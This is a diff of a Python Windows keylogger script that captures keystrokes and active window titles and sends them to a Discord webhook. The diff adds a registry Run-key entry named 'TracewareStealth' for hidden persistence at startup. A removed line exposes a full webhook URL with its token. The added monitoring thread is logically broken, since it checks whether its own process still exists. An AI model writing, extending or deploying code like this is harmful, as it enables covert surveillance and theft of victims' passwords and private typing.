@@ -9,12 +9,11 @@ import win32api
 import keyboard
 import threading
 import atexit
-import getpass
 import winreg as reg
 from datetime import datetime
 
 # Discord Webhook URL
-WEBHOOK_URL = "https://discordapp.com/api/webhooks/1355720476252704798/QfHQTbLamSNlG9dywD-F5hiytst3Cy2tL76Nf6gVtv9GtdU6BKf1XXluZ5UW6ZimOg-B"
+WEBHOOK_URL = ""
 
 # Get PC name
 PC_NAME = socket.gethostname()
@@ -80,19 +79,6 @@ def handle_exit(sig):
 
 win32api.SetConsoleCtrlHandler(handle_exit, True)
 
-# **🔹 NEW: Watchdog to detect script exit**
-def shutdown_watchdog():
-    pid = os.getpid()
-    while True:
-        time.sleep(2)
-        if os.getpid() != pid:  # If the process is killed
-            log_system_shutdown()
-            break
-
-# Run watchdog in background
-watchdog_thread = threading.Thread(target=shutdown_watchdog, daemon=True)
-watchdog_thread.start()
-
 # Function to get active window title
 def get_active_window_title():
     hwnd = win32gui.GetForegroundWindow()
@@ -155,6 +141,32 @@ def keystroke_monitor():
 
 keystroke_thread = threading.Thread(target=keystroke_monitor, daemon=True)
 keystroke_thread.start()
+
+# Function to add the script to Windows startup
+def add_to_startup():
+    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    value_name = "TracewareStealth"
+    script_path = os.path.abspath(__file__)
+    try:
+        with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
+            reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, script_path)
+    except Exception as e:
+        print(f"Failed to add to startup: {e}")
+
+# Add to startup
+add_to_startup()
+
+# Function to monitor if the script is still running
+def monitor_running():
+    while True:
+        time.sleep(15)  # Check every 15 seconds
+        if not psutil.pid_exists(os.getpid()):  # Check if the current process is still running
+            log_system_shutdown()  # Log if the process is not running
+            break
+
+# Start the monitoring thread
+monitor_thread = threading.Thread(target=monitor_running, daemon=True)
+monitor_thread.start()
 
 # Monitoring loop
 def monitor():
